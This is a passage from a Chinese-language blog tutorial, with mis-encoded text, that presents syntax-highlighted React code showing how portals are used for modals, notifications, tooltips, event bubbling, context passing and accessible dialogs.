&#123;<br>      portalContainer = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>      portalContainer.<span class="hljs-property">id</span> = containerId;<br>      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(portalContainer);<br>    &#125;<br>    <br>    <span class="hljs-title function_">setContainer</span>(portalContainer);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-comment">// æ¸…ç†å®¹å™¨</span><br>      <span class="hljs-keyword">if</span> (portalContainer) &#123;<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(portalContainer);<br>      &#125;<br>    &#125;;<br>  &#125;, [containerId]);<br>  <br>  <span class="hljs-keyword">if</span> (!container) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createPortal</span>(children, container);<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br>&lt;<span class="hljs-title class_">SmartPortal</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Notification</span> <span class="hljs-attr">message</span>=<span class="hljs-string">&quot;æ“ä½œæˆåŠŸï¼&quot;</span> /&gt;</span></span><br>&lt;/<span class="hljs-title class_">SmartPortal</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="æ ¸å¿ƒåº”ç”¨åœºæ™¯"><a href="#æ ¸å¿ƒåº”ç”¨åœºæ™¯" class="headerlink" title="æ ¸å¿ƒåº”ç”¨åœºæ™¯"></a>æ ¸å¿ƒåº”ç”¨åœºæ™¯</h3><p><strong>æ¨¡æ€å¯¹è¯æ¡†å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ModalDialog</span>(<span class="hljs-params">&#123; title, children, onClose &#125;</span>) &#123;<br>  <span class="hljs-comment">// é˜»æ­¢èƒŒæ™¯æ»šåŠ¨</span><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">overflow</span> = <span class="hljs-string">&#x27;hidden&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">overflow</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;;<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal-overlay&quot;</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;onClose&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal-dialog&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;e</span> =&gt;</span> e.stopPropagation()&#125;</span><br><span class="language-xml">      &gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal-header&quot;</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>&#123;title&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;onClose&#125;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;å…³é—­&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-symbol">&amp;times;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal-body&quot;</span>&gt;</span></span><br><span class="language-xml">          &#123;children&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ Portal çš„æ¨¡æ€æ¡†ç»„ä»¶</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Modal</span>(<span class="hljs-params">&#123; isOpen, ...props &#125;</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!isOpen) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createPortal</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ModalDialog</span> &#123;<span class="hljs-attr">...props</span>&#125; /&gt;</span></span>,<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;modal-root&#x27;</span>)<br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å…¨å±€é€šçŸ¥ç³»ç»Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">NotificationContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">NotificationProvider</span>(<span class="hljs-params">&#123; children &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [notifications, setNotifications] = <span class="hljs-title function_">useState</span>([]);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">addNotification</span> = (<span class="hljs-params">message, type = <span class="hljs-string">&#x27;info&#x27;</span></span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> id = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <span class="hljs-title function_">setNotifications</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> [...prev, &#123; id, message, type &#125;]);<br>    <br>    <span class="hljs-comment">// è‡ªåŠ¨å…³é—­</span><br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">removeNotification</span>(id);<br>    &#125;, <span class="hljs-number">5000</span>);<br>  &#125;;<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">removeNotification</span> = (<span class="hljs-params">id</span>) =&gt; &#123;<br>    <span class="hljs-title function_">setNotifications</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> n.<span class="hljs-property">id</span> !== id));<br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">NotificationContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">addNotification</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      &#123;children&#125;</span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* ä½¿ç”¨ Portal æ¸²æŸ“åˆ°ç‹¬ç«‹åŒºåŸŸ */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">SmartPortal</span> <span class="hljs-attr">containerId</span>=<span class="hljs-string">&quot;notification-portal&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;notification-container&quot;</span>&gt;</span></span><br><span class="language-xml">          &#123;notifications.map(notification =&gt; (</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">NotificationItem</span> </span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;notification.id&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">notification</span>=<span class="hljs-string">&#123;notification&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">onClose</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> removeNotification(notification.id)&#125;</span><br><span class="language-xml">            /&gt;</span><br><span class="language-xml">          ))&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">SmartPortal</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">NotificationContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// é€šçŸ¥é¡¹ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">NotificationItem</span>(<span class="hljs-params">&#123; notification, onClose &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;</span>`<span class="hljs-attr">notification</span> $&#123;<span class="hljs-attr">notification.type</span>&#125;`&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;notification.message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;onClose&#125;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;å…³é—­é€šçŸ¥&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-symbol">&amp;times;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å·¥å…·æç¤ºä¸æ‚¬æµ®æ¡†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Tooltip</span>(<span class="hljs-params">&#123; children, content &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [isVisible, setIsVisible] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br>  <span class="hljs-keyword">const</span> [position, setPosition] = <span class="hljs-title function_">useState</span>(&#123; <span class="hljs-attr">top</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">left</span>: <span class="hljs-number">0</span> &#125;);<br>  <span class="hljs-keyword">const</span> triggerRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">updatePosition</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (triggerRef.<span class="hljs-property">current</span>) &#123;<br>      <span class="hljs-keyword">const</span> rect = triggerRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">getBoundingClientRect</span>();<br>      <span class="hljs-title function_">setPosition</span>(&#123;<br>        <span class="hljs-attr">top</span>: rect.<span class="hljs-property">bottom</span> + <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span>,<br>        <span class="hljs-attr">left</span>: rect.<span class="hljs-property">left</span> + rect.<span class="hljs-property">width</span> / <span class="hljs-number">2</span><br>      &#125;);<br>    &#125;<br>  &#125;;<br>  <br>  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (isVisible) &#123;<br>      <span class="hljs-title function_">updatePosition</span>();<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, updatePosition);<br>      <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, updatePosition);<br>    &#125;<br>  &#125;, [isVisible]);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">span</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;triggerRef&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onMouseEnter</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setIsVisible(true)&#125;</span><br><span class="language-xml">        onMouseLeave=&#123;() =&gt; setIsVisible(false)&#125;</span><br><span class="language-xml">        onFocus=&#123;() =&gt; setIsVisible(true)&#125;</span><br><span class="language-xml">        onBlur=&#123;() =&gt; setIsVisible(false)&#125;</span><br><span class="language-xml">        aria-describedby=&quot;tooltip-content&quot;</span><br><span class="language-xml">      &gt;</span><br><span class="language-xml">        &#123;children&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* ä½¿ç”¨ Portal é¿å…è¢«çˆ¶å®¹å™¨è£å‰ª */&#125;</span><br><span class="language-xml">      &#123;isVisible &amp;&amp; (</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">SmartPortal</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;tooltip-content&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;tooltip&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;tooltip&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">position:</span> &#x27;<span class="hljs-attr">absolute</span>&#x27;,</span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">top:</span> `$&#123;<span class="hljs-attr">position.top</span>&#125;<span class="hljs-attr">px</span>`,</span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">left:</span> `$&#123;<span class="hljs-attr">position.left</span>&#125;<span class="hljs-attr">px</span>`,</span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">transform:</span> &#x27;<span class="hljs-attr">translateX</span>(<span class="hljs-attr">-50</span>%)&#x27;</span></span><br><span class="hljs-tag"><span class="language-xml">            &#125;&#125;</span></span><br><span class="hljs-tag"><span class="language-xml">          &gt;</span></span><br><span class="language-xml">            &#123;content&#125;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">SmartPortal</span>&gt;</span></span><br><span class="language-xml">      )&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜çº§ç‰¹æ€§ä¸æ¨¡å¼"><a href="#é«˜çº§ç‰¹æ€§ä¸æ¨¡å¼" class="headerlink" title="é«˜çº§ç‰¹æ€§ä¸æ¨¡å¼"></a>é«˜çº§ç‰¹æ€§ä¸æ¨¡å¼</h3><p><strong>äº‹ä»¶å†’æ³¡å¤„ç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">EventDemo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePortalClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Portal å†…å®¹è¢«ç‚¹å‡»&#x27;</span>);<br>  &#125;;<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleParentClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;çˆ¶ç»„ä»¶è¢«ç‚¹å‡»&#x27;</span>);<br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleParentClick&#125;</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;parent&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>äº‹ä»¶å†’æ³¡æµ‹è¯•<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* Portal å†…å®¹ä¼šå†’æ³¡åˆ° React æ ‘ä¸­çš„çˆ¶ç»„ä»¶ */&#125;</span><br><span class="language-xml">      &#123;ReactDOM.createPortal(</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handlePortalClick&#125;</span>&gt;</span></span><br><span class="language-xml">          ç‚¹å‡»æˆ‘ï¼ˆPortal æŒ‰é’®ï¼‰</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>,</span><br><span class="language-xml">        document.getElementById(&#x27;portal-root&#x27;)</span><br><span class="language-xml">      )&#125;</span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">        ç‚¹å‡» Portal æŒ‰é’®ä¼šè§¦å‘ä¸¤ä¸ªæ—¥å¿—ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br><span class="language-xml">        1. &quot;Portal å†…å®¹è¢«ç‚¹å‡»&quot;<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br><span class="language-xml">        2. &quot;çˆ¶ç»„ä»¶è¢«ç‚¹å‡»&quot;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¸Šä¸‹æ–‡ä¼ é€’</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemedPortalDemo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;dark&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">        </span><br><span class="language-xml">        &#123;/* Portal å†…å®¹èƒ½è®¿é—® React æ ‘ä¸­çš„ä¸Šä¸‹æ–‡ */&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">SmartPortal</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Consumer</span>&gt;</span></span><br><span class="language-xml">            &#123;theme =&gt; (</span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;</span>`<span class="hljs-attr">theme-box</span> $&#123;<span class="hljs-attr">theme</span>&#125;`&#125;&gt;</span></span><br><span class="language-xml">                å½“å‰ä¸»é¢˜: &#123;theme&#125;</span><br><span class="language-xml">              <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            )&#125;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Consumer</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">SmartPortal</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ— éšœç¢å¯¹è¯æ¡†å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">AccessibleModal</span>(<span class="hljs-params">&#123; isOpen, title, children, onClose &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> modalRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-comment">// å…³é—­æ—¶è¿”å›ç„¦ç‚¹åˆ°è§¦å‘å…ƒç´ </span><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> triggerElement = <span class="hljs-variable language_">document</span>.<span class="hljs-property">activeElement</span>;<br>    <br>    <span class="hljs-keyword">if</span> (isOpen &amp;&amp; modalRef.<span class="hljs-property">current</span>) &#123;<br>      modalRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>();<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (triggerElement) &#123;<br>        triggerElement.<span class="hljs-title function_">focus</span>();<br>      &#125;<br>    &#125;;<br>  &#125;, [isOpen]);<br>  <br>  <span class="hljs-comment">// ESC é”®å…³é—­</span><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleKeyDown</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>      <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">&#x27;Escape&#x27;</span>) &#123;<br>        <span class="hljs-title function_">onClose</span>();<br>      &#125;<br>    &#125;;<br>    <br>    <span class="hljs-keyword">if</span> (isOpen) &#123;<br>      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;keydown&#x27;</span>, 